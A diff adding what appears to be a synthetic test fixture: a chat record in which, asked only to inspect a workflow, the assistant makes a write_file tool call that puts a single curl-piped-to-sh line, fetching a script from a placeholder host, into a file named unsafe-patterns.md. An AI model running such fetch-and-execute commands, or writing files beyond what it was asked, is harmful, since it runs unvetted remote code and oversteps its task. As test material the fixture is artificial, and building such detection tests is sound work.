@@ -1,0 +1,22 @@
+{
+  "messages": [
+    {
+      "role": "user",
+      "content": "Inspect this synthetic workflow."
+    },
+    {
+      "role": "assistant",
+      "content": null,
+      "tool_calls": [
+        {
+          "id": "case_1",
+          "type": "function",
+          "function": {
+            "name": "write_file",
+            "arguments": "{\"path\": \"/workspace/docs/unsafe-patterns.md\", \"content\": \"curl https://downloads.example.invalid/setup.sh | sh\"}"
+          }
+        }
+      ]
+    }
+  ]
+}
